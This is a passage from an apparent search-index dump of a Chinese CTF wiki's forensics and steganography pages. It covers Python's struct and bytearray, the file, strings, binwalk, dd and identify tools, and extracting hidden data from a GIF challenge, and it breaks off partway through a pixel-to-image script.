\u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\uff0c\u5b58\u53d6\u6587\u4ef6\uff0csocket \u64cd\u4f5c\u65f6\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528 Python \u7684 struct \u6a21\u5757\u6765\u5b8c\u6210\u3002\n\n\nstruct \u6a21\u5757\u4e2d\u6700\u91cd\u8981\u7684\u4e09\u4e2a\u51fd\u6570\u662f \npack()\n\u3001\nunpack()\n \u548c \ncalcsize()\n\n\n\n\npack(fmt, v1, v2, ...)\n \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\uff0c\u628a\u6570\u636e\u5c01\u88c5\u6210\u5b57\u7b26\u4e32\uff08\u5b9e\u9645\u4e0a\u662f\u7c7b\u4f3c\u4e8ec\u7ed3\u6784\u4f53\u7684\u5b57\u8282\u6d41\uff09\n\n\nunpack(fmt, string)\n \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u89e3\u6790\u5b57\u8282\u6d41 string\uff0c\u8fd4\u56de\u89e3\u6790\u51fa\u6765\u7684 tuple\n\n\ncalcsize(fmt)\n \u8ba1\u7b97\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u5360\u7528\u591a\u5c11\u5b57\u8282\u7684\u5185\u5b58\n\n\n\n\n\u8fd9\u91cc\u6253\u5305\u683c\u5f0f \nfmt\n \u786e\u5b9a\u4e86\u5c06\u53d8\u91cf\u6309\u7167\u4ec0\u4e48\u65b9\u5f0f\u6253\u5305\u6210\u5b57\u8282\u6d41\uff0c\u5176\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u7ed9\u51fa\u4e0d\u540c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u542b\u4e49\u4e86\uff0c\u8be6\u7ec6\u7ec6\u8282\u53ef\u4ee5\u53c2\u7167 \nPython Doc\n\n\n \nimport\n \nstruct\n\n\n \nstruct\n.\npack\n(\nI\n,\n16\n)\n\n\n\\x00\\x00\\x00\\x10\n\n\n\n\n\npack\n \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c\n'\nI'\n \u7684\u610f\u601d\u662f\uff1a\n \u8868\u793a\u5b57\u8282\u987a\u5e8f\u662f Big-Endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0c\nI\n \u8868\u793a 4 \u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002\n\n\n\u540e\u9762\u7684\u53c2\u6570\u4e2a\u6570\u8981\u548c\u5904\u7406\u6307\u4ee4\u4e00\u81f4\u3002\n\n\n\u8bfb\u5165\u4e00\u4e2a BMP \u6587\u4ef6\u7684\u524d 30 \u5b57\u8282\uff0c\u6587\u4ef6\u5934\u7684\u7ed3\u6784\u6309\u987a\u5e8f\u5982\u4e0b\n\n\n\n\n\u4e24\u4e2a\u5b57\u8282\uff1a\nBM\n \u8868\u793a Windows \u4f4d\u56fe\uff0c\nBA\n \u8868\u793a OS/2 \u4f4d\u56fe\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u8868\u793a\u4f4d\u56fe\u5927\u5c0f\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u4fdd\u7559\u4f4d\uff0c\u59cb\u7ec8\u4e3a 0\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u5b9e\u9645\u56fe\u50cf\u7684\u504f\u79fb\u91cf\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1aHeader \u7684\u5b57\u8282\u6570\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u5bbd\u5ea6\n\n\n\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u9ad8\u5ea6\n\n\n\u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u59cb\u7ec8\u4e3a 1\n\n\n\u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u989c\u8272\u6570\n\n\n\n\n \nimport\n \nstruct\n\n\n \nbmp\n \n=\n \n\\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00\n\n\n \nstruct\n.\nunpack\n(\nccIIIIIIHH\n,\nbmp\n)\n\n\n(\nB\n,\n \nM\n,\n \n691256\n,\n \n0\n,\n \n54\n,\n \n40\n,\n \n640\n,\n \n360\n,\n \n1\n,\n \n24\n)\n\n\n\n\n\nbytearray \u5b57\u8282\u6570\u7ec4\n\n\n\u5c06\u6587\u4ef6\u4ee5\u4e8c\u8fdb\u5236\u6570\u7ec4\u5f62\u5f0f\u8bfb\u53d6\n\n\ndata\n \n=\n \nbytearray\n(\nopen\n(\nchallenge.png\n,\n \nrb\n)\n.\nread\n())\n\n\n\n\n\n\u5b57\u8282\u6570\u7ec4\u5c31\u662f\u53ef\u53d8\u7248\u672c\u7684\u5b57\u8282\n\n\ndata\n[\n0\n]\n \n=\n \n\\x89\n\n\n\n\n\n\u5e38\u7528\u5de5\u5177\n\n\n010 Editor\n\n\nSweetScape 010 Editor \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5341\u516d\u8fdb\u4f4d\u6587\u4ef6\u7f16\u8f91\u5668\uff0c\u5b83\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5341\u516d\u8fdb\u4f4d\u7f16\u8f91\u5668\u5728\u4e8e\u5b83\u53ef\u7528\u300c\u8303\u672c\u300d\u6765\u89e3\u6790\u4e8c\u8fdb\u4f4d\u6587\u4ef6\uff0c\u4ece\u800c\u8ba9\u4f60\u8bfb\u61c2\u548c\u7f16\u8f91\u5b83\u3002\u5b83\u8fd8\u53ef\u7528\u6765\u6bd4\u8f83\u4e00\u5207\u53ef\u89c6\u7684\u4e8c\u8fdb\u4f4d\u6587\u4ef6\u3002\n\n\n\u5229\u7528\u5b83\u7684\u6a21\u677f\u529f\u80fd\u53ef\u4ee5\u975e\u5e38\u8f7b\u677e\u7684\u89c2\u5bdf\u6587\u4ef6\u5185\u90e8\u7684\u5177\u4f53\u7ed3\u6784\u5e76\u4e14\u4f9d\u6b64\u5feb\u901f\u66f4\u6539\u5185\u5bb9\u3002\n\n\n\n\nfile\n \u547d\u4ee4\n\n\nfile\n \u547d\u4ee4\u6839\u636e\u6587\u4ef6\u5934\uff08\u9b54\u6cd5\u5b57\u8282\uff09\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7c7b\u578b\u3002\n\n\nroot in ~/Desktop/tmp \u03bb file flag\nflag: PNG image data, \n450\n x \n450\n, \n8\n-bit grayscale, non-interlaced\n\n\n\n\nstrings\n \u547d\u4ee4\n\n\n\u6253\u5370\u6587\u4ef6\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u7ecf\u5e38\u7528\u6765\u53d1\u73b0\u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f\u6216\u662f\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\u4fe1\u606f\uff0c\u5e38\u5e38\u7528\u6765\u53d1\u73b0\u9898\u76ee\u7684\u7a81\u7834\u53e3\u3002\n\n\n\n\n\n\n\u53ef\u4ee5\u914d\u5408 \ngrep\n \u547d\u4ee4\u63a2\u6d4b\u6307\u5b9a\u4fe1\u606f\n\n\nstrings test\n|\ngrep -i XXCTF\n\n\n\n\n\n\n\n\n\u4e5f\u53ef\u4ee5\u914d\u5408 \n-o\n \u53c2\u6570\u83b7\u53d6\u6240\u6709 ASCII \u5b57\u7b26\u504f\u79fb\n\n\nroot in ~/Desktop/tmp \u03bb strings -o flag\n|\nhead\n    \n14\n IHDR\n    \n45\n gAMA\n    \n64\n  cHRM\n    \n141\n bKGD\n    \n157\n tIME\n    \n202\n IDATx\n    \n223\n NFdVK3\n    \n361\n \n|;\n*-\n    \n410\n Ge%\nW\n    \n431\n 5duX@%\n\n\n\n\n\n\n\n\nbinwalk\n \u547d\u4ee4\n\n\nbinwalk \u672c\u662f\u4e00\u4e2a\u56fa\u4ef6\u7684\u5206\u6790\u5de5\u5177\uff0c\u6bd4\u8d5b\u4e2d\u5e38\u7528\u6765\u53d1\u73b0\u591a\u4e2a\u6587\u4ef6\u7c98\u5408\u518d\u5728\u4e00\u8d77\u7684\u60c5\u51b5\u3002\u6839\u636e\u6587\u4ef6\u5934\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5939\u6742\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6709\u65f6\u4e5f\u4f1a\u5b58\u5728\u8bef\u62a5\u7387\uff08\u5c24\u5176\u662f\u5bf9Pcap\u6d41\u91cf\u5305\u7b49\u6587\u4ef6\u65f6\uff09\u3002\n\n\nroot in ~/Desktop/tmp \u03bb binwalk flag\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n0\n             0x0             PNG image, \n450\n x \n450\n, \n8\n-bit grayscale, non-interlaced\n\n134\n           0x86            Zlib compressed data, best compression\n\n25683\n         0x6453          Zip archive data, at least v2.0 to extract, compressed size: \n675\n, uncompressed size: \n1159\n, name: readme.txt\n\n26398\n         0x671E          Zip archive data, at least v2.0 to extract, compressed size: \n430849\n, uncompressed size: \n1027984\n, name: trid\n\n457387\n        0x6FAAB         End of Zip archive\n\n\n\n\n\u914d\u5408 \n-e\n \u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u81ea\u52a8\u5316\u63d0\u53d6\u3002\n\n\n\u4e5f\u53ef\u4ee5\u7ed3\u5408 \ndd\n \u547d\u4ee4\u8fdb\u884c\u624b\u52a8\u5207\u5272\u3002\n\n\nroot in ~/Desktop/tmp \u03bb dd \nif\n=\nflag \nof\n=\n1\n.zip \nbs\n=\n1\n \nskip\n=\n25683\n\n\n431726\n+0 records in\n\n431726\n+0 records out\n\n431726\n bytes \n(\n432\n kB, \n422\n KiB\n)\n copied, \n0\n.900973 s, \n479\n kB/s", 
            "title": "\u53d6\u8bc1\u9690\u5199\u524d\u7f6e\u6280\u672f"
        }, 
        {
            "location": "/misc/prefix/#_1", 
            "text": "\u4e86\u89e3\u5e38\u89c1\u7684\u7f16\u7801  \u80fd\u591f\u5bf9\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u4e00\u4e9b\u7f16\u7801\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u4e14\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\uff08Base64\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7b49\uff09\u6709\u4e00\u5b9a\u7684\u654f\u611f\u5ea6\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5e76\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002    \u80fd\u591f\u5229\u7528\u811a\u672c\u8bed\u8a00\uff08Python \u7b49\uff09\u53bb\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e   \u719f\u77e5\u5e38\u89c1\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5c24\u5176\u662f\u5404\u7c7b  \u6587\u4ef6\u5934 \u3001\u534f\u8bae\u3001\u7ed3\u6784\u7b49  \u7075\u6d3b\u8fd0\u7528\u5e38\u89c1\u7684\u5de5\u5177", 
            "title": "\u524d\u7f6e\u6280\u80fd"
        }, 
        {
            "location": "/misc/prefix/#python", 
            "text": "", 
            "title": "Python \u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e"
        }, 
        {
            "location": "/misc/prefix/#struct", 
            "text": "\u6709\u7684\u65f6\u5019\u9700\u8981\u7528 Python \u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\uff0c\u5b58\u53d6\u6587\u4ef6\uff0csocket \u64cd\u4f5c\u65f6\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528 Python \u7684 struct \u6a21\u5757\u6765\u5b8c\u6210\u3002  struct \u6a21\u5757\u4e2d\u6700\u91cd\u8981\u7684\u4e09\u4e2a\u51fd\u6570\u662f  pack() \u3001 unpack()  \u548c  calcsize()   pack(fmt, v1, v2, ...)  \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\uff0c\u628a\u6570\u636e\u5c01\u88c5\u6210\u5b57\u7b26\u4e32\uff08\u5b9e\u9645\u4e0a\u662f\u7c7b\u4f3c\u4e8ec\u7ed3\u6784\u4f53\u7684\u5b57\u8282\u6d41\uff09  unpack(fmt, string)  \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u89e3\u6790\u5b57\u8282\u6d41 string\uff0c\u8fd4\u56de\u89e3\u6790\u51fa\u6765\u7684 tuple  calcsize(fmt)  \u8ba1\u7b97\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u5360\u7528\u591a\u5c11\u5b57\u8282\u7684\u5185\u5b58   \u8fd9\u91cc\u6253\u5305\u683c\u5f0f  fmt  \u786e\u5b9a\u4e86\u5c06\u53d8\u91cf\u6309\u7167\u4ec0\u4e48\u65b9\u5f0f\u6253\u5305\u6210\u5b57\u8282\u6d41\uff0c\u5176\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u7ed9\u51fa\u4e0d\u540c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u542b\u4e49\u4e86\uff0c\u8be6\u7ec6\u7ec6\u8282\u53ef\u4ee5\u53c2\u7167  Python Doc    import   struct    struct . pack ( I , 16 )  \\x00\\x00\\x00\\x10   pack  \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c ' I'  \u7684\u610f\u601d\u662f\uff1a  \u8868\u793a\u5b57\u8282\u987a\u5e8f\u662f Big-Endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0c I  \u8868\u793a 4 \u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002  \u540e\u9762\u7684\u53c2\u6570\u4e2a\u6570\u8981\u548c\u5904\u7406\u6307\u4ee4\u4e00\u81f4\u3002  \u8bfb\u5165\u4e00\u4e2a BMP \u6587\u4ef6\u7684\u524d 30 \u5b57\u8282\uff0c\u6587\u4ef6\u5934\u7684\u7ed3\u6784\u6309\u987a\u5e8f\u5982\u4e0b   \u4e24\u4e2a\u5b57\u8282\uff1a BM  \u8868\u793a Windows \u4f4d\u56fe\uff0c BA  \u8868\u793a OS/2 \u4f4d\u56fe  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u8868\u793a\u4f4d\u56fe\u5927\u5c0f  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u4fdd\u7559\u4f4d\uff0c\u59cb\u7ec8\u4e3a 0  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u5b9e\u9645\u56fe\u50cf\u7684\u504f\u79fb\u91cf  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1aHeader \u7684\u5b57\u8282\u6570  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u5bbd\u5ea6  \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u9ad8\u5ea6  \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u59cb\u7ec8\u4e3a 1  \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u989c\u8272\u6570     import   struct    bmp   =   \\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00    struct . unpack ( ccIIIIIIHH , bmp )  ( B ,   M ,   691256 ,   0 ,   54 ,   40 ,   640 ,   360 ,   1 ,   24 )", 
            "title": "struct \u6a21\u5757"
        }, 
        {
            "location": "/misc/prefix/#bytearray", 
            "text": "\u5c06\u6587\u4ef6\u4ee5\u4e8c\u8fdb\u5236\u6570\u7ec4\u5f62\u5f0f\u8bfb\u53d6  data   =   bytearray ( open ( challenge.png ,   rb ) . read ())   \u5b57\u8282\u6570\u7ec4\u5c31\u662f\u53ef\u53d8\u7248\u672c\u7684\u5b57\u8282  data [ 0 ]   =   \\x89", 
            "title": "bytearray \u5b57\u8282\u6570\u7ec4"
        }, 
        {
            "location": "/misc/prefix/#_2", 
            "text": "", 
            "title": "\u5e38\u7528\u5de5\u5177"
        }, 
        {
            "location": "/misc/prefix/#010-editor", 
            "text": "SweetScape 010 Editor \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u5341\u516d\u8fdb\u4f4d\u6587\u4ef6\u7f16\u8f91\u5668\uff0c\u5b83\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5341\u516d\u8fdb\u4f4d\u7f16\u8f91\u5668\u5728\u4e8e\u5b83\u53ef\u7528\u300c\u8303\u672c\u300d\u6765\u89e3\u6790\u4e8c\u8fdb\u4f4d\u6587\u4ef6\uff0c\u4ece\u800c\u8ba9\u4f60\u8bfb\u61c2\u548c\u7f16\u8f91\u5b83\u3002\u5b83\u8fd8\u53ef\u7528\u6765\u6bd4\u8f83\u4e00\u5207\u53ef\u89c6\u7684\u4e8c\u8fdb\u4f4d\u6587\u4ef6\u3002  \u5229\u7528\u5b83\u7684\u6a21\u677f\u529f\u80fd\u53ef\u4ee5\u975e\u5e38\u8f7b\u677e\u7684\u89c2\u5bdf\u6587\u4ef6\u5185\u90e8\u7684\u5177\u4f53\u7ed3\u6784\u5e76\u4e14\u4f9d\u6b64\u5feb\u901f\u66f4\u6539\u5185\u5bb9\u3002", 
            "title": "010 Editor"
        }, 
        {
            "location": "/misc/prefix/#file", 
            "text": "file  \u547d\u4ee4\u6839\u636e\u6587\u4ef6\u5934\uff08\u9b54\u6cd5\u5b57\u8282\uff09\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7c7b\u578b\u3002  root in ~/Desktop/tmp \u03bb file flag\nflag: PNG image data,  450  x  450 ,  8 -bit grayscale, non-interlaced", 
            "title": "file \u547d\u4ee4"
        }, 
        {
            "location": "/misc/prefix/#strings", 
            "text": "\u6253\u5370\u6587\u4ef6\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\uff0c\u7ecf\u5e38\u7528\u6765\u53d1\u73b0\u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f\u6216\u662f\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\u4fe1\u606f\uff0c\u5e38\u5e38\u7528\u6765\u53d1\u73b0\u9898\u76ee\u7684\u7a81\u7834\u53e3\u3002    \u53ef\u4ee5\u914d\u5408  grep  \u547d\u4ee4\u63a2\u6d4b\u6307\u5b9a\u4fe1\u606f  strings test | grep -i XXCTF    \u4e5f\u53ef\u4ee5\u914d\u5408  -o  \u53c2\u6570\u83b7\u53d6\u6240\u6709 ASCII \u5b57\u7b26\u504f\u79fb  root in ~/Desktop/tmp \u03bb strings -o flag | head\n     14  IHDR\n     45  gAMA\n     64   cHRM\n     141  bKGD\n     157  tIME\n     202  IDATx\n     223  NFdVK3\n     361   |; *-\n     410  Ge% W\n     431  5duX@%", 
            "title": "strings \u547d\u4ee4"
        }, 
        {
            "location": "/misc/prefix/#binwalk", 
            "text": "binwalk \u672c\u662f\u4e00\u4e2a\u56fa\u4ef6\u7684\u5206\u6790\u5de5\u5177\uff0c\u6bd4\u8d5b\u4e2d\u5e38\u7528\u6765\u53d1\u73b0\u591a\u4e2a\u6587\u4ef6\u7c98\u5408\u518d\u5728\u4e00\u8d77\u7684\u60c5\u51b5\u3002\u6839\u636e\u6587\u4ef6\u5934\u53bb\u8bc6\u522b\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5939\u6742\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6709\u65f6\u4e5f\u4f1a\u5b58\u5728\u8bef\u62a5\u7387\uff08\u5c24\u5176\u662f\u5bf9Pcap\u6d41\u91cf\u5305\u7b49\u6587\u4ef6\u65f6\uff09\u3002  root in ~/Desktop/tmp \u03bb binwalk flag\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------------------------------------- 0              0x0             PNG image,  450  x  450 ,  8 -bit grayscale, non-interlaced 134            0x86            Zlib compressed data, best compression 25683          0x6453          Zip archive data, at least v2.0 to extract, compressed size:  675 , uncompressed size:  1159 , name: readme.txt 26398          0x671E          Zip archive data, at least v2.0 to extract, compressed size:  430849 , uncompressed size:  1027984 , name: trid 457387         0x6FAAB         End of Zip archive  \u914d\u5408  -e  \u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u81ea\u52a8\u5316\u63d0\u53d6\u3002  \u4e5f\u53ef\u4ee5\u7ed3\u5408  dd  \u547d\u4ee4\u8fdb\u884c\u624b\u52a8\u5207\u5272\u3002  root in ~/Desktop/tmp \u03bb dd  if = flag  of = 1 .zip  bs = 1   skip = 25683  431726 +0 records in 431726 +0 records out 431726  bytes  ( 432  kB,  422  KiB )  copied,  0 .900973 s,  479  kB/s", 
            "title": "binwalk \u547d\u4ee4"
        }, 
        {
            "location": "/misc/picture/introduction/", 
            "text": "\u56fe\u50cf\u6587\u4ef6\u80fd\u591f\u5f88\u597d\u5730\u5305\u542b\u9ed1\u5ba2\u6587\u5316\uff0c\u56e0\u6b64 CTF \u7ade\u8d5b\u4e2d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5404\u79cd\u56fe\u50cf\u6587\u4ef6\u3002\n\n\n\u56fe\u50cf\u6587\u4ef6\u6709\u591a\u79cd\u590d\u6742\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u5404\u79cd\u6d89\u53ca\u5230\u5143\u6570\u636e\u3001\u4fe1\u606f\u4e22\u5931\u548c\u65e0\u635f\u538b\u7f29\u3001\u6821\u9a8c\u3001\u9690\u5199\u6216\u53ef\u89c6\u5316\u6570\u636e\u7f16\u7801\u7684\u5206\u6790\u89e3\u5bc6\uff0c\u90fd\u662f Misc \u4e2d\u7684\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u51fa\u9898\u65b9\u5411\u3002\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\u5f88\u591a\uff08\u5305\u62ec\u57fa\u672c\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5e38\u89c1\u7684\u9690\u5199\u624b\u6cd5\u53ca\u9690\u5199\u7528\u7684\u8f6f\u4ef6\uff09\uff0c\u6709\u7684\u5730\u65b9\u4e5f\u9700\u8981\u53bb\u8fdb\u884c\u6df1\u5165\u7684\u7406\u89e3\u3002\n\n\n\u5143\u6570\u636e\uff08Metadata\uff09\n\n\n\n\n\u5143\u6570\u636e\uff08Metadata\uff09\uff0c\u53c8\u79f0\u4e2d\u4ecb\u6570\u636e\u3001\u4e2d\u7ee7\u6570\u636e\uff0c\u4e3a\u63cf\u8ff0\u6570\u636e\u7684\u6570\u636e\uff08Data about data\uff09\uff0c\u4e3b\u8981\u662f\u63cf\u8ff0\u6570\u636e\u5c5e\u6027\uff08property\uff09\u7684\u4fe1\u606f\uff0c\u7528\u6765\u652f\u6301\u5982\u6307\u793a\u5b58\u50a8\u4f4d\u7f6e\u3001\u5386\u53f2\u6570\u636e\u3001\u8d44\u6e90\u67e5\u627e\u3001\u6587\u4ef6\u8bb0\u5f55\u7b49\u529f\u80fd\u3002\n\n\n\n\n\u5143\u6570\u636e\u4e2d\u9690\u85cf\u4fe1\u606f\u5728\u6bd4\u8d5b\u4e2d\u662f\u6700\u57fa\u672c\u7684\u4e00\u79cd\u624b\u6cd5\uff0c\u901a\u5e38\u7528\u6765\u9690\u85cf\u4e00\u4e9b\u5173\u952e\u7684 \nHint\n \u4fe1\u606f\u6216\u8005\u662f\u4e00\u4e9b\u91cd\u8981\u7684\u5982 \npassword\n \u7b49\u4fe1\u606f\u3002\n\n\n\u8fd9\u7c7b\u5143\u6570\u636e\u4f60\u53ef\u4ee5 \n\u53f3\u952e --\n \u5c5e\u6027\n \u53bb\u67e5\u770b,\u4e5f\u53ef\u4ee5\u901a\u8fc7 \nstrings\n \u547d\u4ee4\u53bb\u67e5\u770b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e9b\u9690\u85cf\u7684\u4fe1\u606f\uff08\u5947\u602a\u7684\u5b57\u7b26\u4e32\uff09\u5e38\u5e38\u51fa\u73b0\u5728\u5934\u90e8\u6216\u8005\u5c3e\u90e8\u3002\n\n\n\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e2a \nidentify\n \u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u683c\u5f0f\u548c\u7279\u6027\u3002\n\n\n-format\n \u7528\u6765\u6307\u5b9a\u663e\u793a\u7684\u4fe1\u606f\uff0c\u7075\u6d3b\u4f7f\u7528\u5b83\u7684 \n-format\n \u53c2\u6570\u53ef\u4ee5\u7ed9\u89e3\u9898\u5e26\u6765\u4e0d\u5c11\u65b9\u4fbf\u3002\nformat\u5404\u4e2a\u53c2\u6570\u5177\u4f53\u610f\u4e49\n\n\n\u4f8b\u9898\n\n\nBreak In 2017 - Mysterious GIF\n\n\n\u8fd9\u9898\u7684\u4e00\u4e2a\u96be\u70b9\u662f\u53d1\u73b0\u5e76\u63d0\u53d6 GIF \u4e2d\u7684\u5143\u6570\u636e\uff0c\u9996\u5148 \nstrings\n \u662f\u53ef\u4ee5\u89c2\u5bdf\u5230\u5f02\u5e38\u70b9\u7684\u3002\n\n\nGIF89a\n   !!!\n###\n$$\n$\n%%%\n((()))***+++,,,---...///000111222333444555666777888999:::;;;\n===\n???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~\n\n\n4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\n\n\nNETSCAPE2.0\n\n\nImageMagick\n\n\n...\n\n\n\n\n\n\u8fd9\u91cc\u7684\u4e00\u4e3216\u8fdb\u5236\u5176\u5b9e\u662f\u85cf\u5728 GIF \u7684\u5143\u6570\u636e\u533a\n\n\n\u63a5\u4e0b\u6765\u5c31\u662f\u63d0\u53d6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 Python\uff0c\u4f46\u662f\u5229\u7528 \nidentify\n \u663e\u5f97\u66f4\u52a0\u4fbf\u6377\n\n\nroot in ~/Desktop/tmp \u03bb identify -format \n%s %c \\n\n Question.gif\n\n0\n 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\n\n1\n 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271\n...\n\n24\n 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f\n\n25\n 724b3052485a6b745062457335797444737142486435504646773d3d\n\n\n\n\n\u5176\u4ed6\u8fc7\u7a0b\u8fd9\u91cc\u4e0d\u5728\u53d9\u8ff0\uff0c\u53ef\u53c2\u8003\u94fe\u63a5\u4e2d\u7684 Writeup\n\n\n\u50cf\u7d20\u503c\u8f6c\u5316\n\n\n\u770b\u770b\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u6570\u636e\uff0c\u4f60\u80fd\u60f3\u5230\u4ec0\u4e48\uff1f\n\n\n255,255,255,255,255...........\n\n\n\n\n\u662f\u4e00\u4e32 RGB \u503c\uff0c\u5c1d\u8bd5\u7740\u5c06\u4ed6\u8f6c\u5316\u4e3a\u56fe\u7247\n\n\nfrom\n \nPIL\n \nimport\n \nImage\n\n\nimport\n \nre\n\n\n\nx\n \n=\n \n307\n \n#x\u5750\u6807  \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206\u89e3\n\n\ny\n \n=\n \n311\n \n#y\u5750\u6807  x*y = \u884c\u6570\n\n\n\nrgb1\n \n=\n \n[\n****\n]\n\n\nprint\n \nlen\n(\nrgb1\n)\n/\n3\n\n\nm\n=\n0\n\n\nfor\n \ni\n \nin\n \nxrange\n(\n0\n,\nx\n):\n\n    \nfor\n \nj\n \nin\n \nxrange\n(\n0\n,\ny\n):\n\n\n        \nline\n \n=\n \nrgb1\n[(\n3\n*\nm\n):(\n3\n*\n(\nm\n+\n1\n))]\n#\u83b7\u53d6\u4e00\u884c\n\n        \nm\n+=\n1\n\n        \nrgb\n \n=\n 